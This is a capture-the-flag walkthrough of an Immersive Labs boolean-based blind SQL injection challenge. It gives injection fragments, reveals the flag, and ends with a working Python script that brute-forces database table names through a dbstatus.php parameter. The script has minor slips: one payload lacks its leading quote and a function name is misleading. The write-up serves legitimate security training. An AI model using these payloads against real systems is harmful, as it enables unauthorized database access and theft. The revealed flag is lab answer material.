---
date: 2025-02-07
categories: [CTF, ImmersiveLabs]
title: "IML - SQL Injection – Boolean-Based Blind"
tags: ['http', 'sql', 'sqli', 'rce']

description: "SQL Injection – Boolean-Based - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - SQL Injection – Boolean-Based Blind

[==https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet==](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)

# ![image1](../resources/fe285dbee3a94cb39237250c0a4785c0.png)


![image2](../resources/2a97e65620e9471ba0af7570a289abf1.png)


![image3](../resources/8ce4225cb1554bfc8964d758cd2f83d4.png)


![image4](../resources/4570b8ad300547bd8fd1a1c3163e0b81.png)

- Modify the \<vulnerable parameter\> in the script to secret
(script below)


![image5](../resources/8184673fee3b45349450eba05b7e06ed.png)


![image6](../resources/5e2a063b6d7449708497114231089566.png)

[https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi)

- Use the payloads on the github link above, to modify the script
(script below)


![image7](../resources/8a1673fcdfe44d2690e6ec4947870b82.png)


![image8](../resources/01f47b13f0784805b87bfba78b3cd4c3.png)


![image9](../resources/cca450ef4d25473caa140a1667a4d3aa.png)

- Use the generic way of finding column names:
```bash
group_concat(column_name) from information_schema.columns where table_name="users"

```
and modify the script

(script below)


![image10](../resources/79d5f8cf307b4e40b8f68c1c0d50ed2f.png)

- Modify the script (script below) to find the flag
```bash
select secret from data

```

![image11](../resources/a37f0e8c753d4168a997110274189715.png)

Change the range of the for j loop - to include more characters


![image12](../resources/7854b17d11ef48fc9f30dfc28c171837.png)


![image13](../resources/6b402aaa99294b179c32d07f6643058f.png)

**Flag is <u>74f87f</u> \<---- Ignore the Capital F's**

**<u>Blind SQLi DB name bruteforce script</u>**


![image14](../resources/80f48c227cad45248b1d24b30cf334ed.png)

**<u>Blind SQLi Table name bruteforce script</u>**


![image15](../resources/2146f6d7c6f9447387b00f079f8a8521.png)

**<u>Blind SQLi Column name bruteforce script</u>**


![image16](../resources/b53d760778b14d6a9a1eae936d0cb00e.png)

**<u>Find the flag</u>**


![image17](../resources/b8dad631e27e4e219ce191cf6dd8f851.png)

**<u>Script:</u>**

```python
import requests
import sys

# Send the payload to the vulnerable parameter on the target host
# If "OK" is found on the webpage -> true response
def send_payload(ip, payload):
    r = requests.get("http://" + ip + "/dbstatus.php?secret=" + payload)
    if "OK" in r.text:
        return True
    else:
        return False

# Brute-force the length of the database table name
# Then iterate over characters to brute-force the table name
def brute_db(ip):
    length = 0
    for i in range(0, 100):
        if send_payload(ip, "'%20OR%20LENGTH((select table_name from information_schema.tables where table_schema=database()))=%d" % i):
            length = i
            break

    db_name = ''
    for i in range(1, length + 1):
        for j in range(96, 123):  # a-z
            if send_payload(ip, "%20OR%20SUBSTRING((select table_name from information_schema.tables where table_schema=database()),%d,1)='%s" % (i, chr(j))):
                db_name += chr(j)
                break
    return db_name

def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <ip>" % (sys.argv[0]))
        sys.exit(1)

    ip = sys.argv[1]
    print(brute_db(ip))

if __name__ == "__main__":
    main()

```
